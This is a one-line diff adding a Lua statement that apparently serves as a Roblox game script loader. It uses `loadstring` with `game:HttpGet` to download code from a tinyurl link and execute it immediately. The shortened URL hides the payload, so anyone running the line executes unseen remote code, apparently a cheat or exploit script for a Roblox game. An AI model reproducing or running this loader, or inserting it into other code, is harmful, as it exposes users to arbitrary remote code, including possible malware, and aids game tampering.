@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://tinyurl.com/Roblox-RetroCircus-game-script"))()
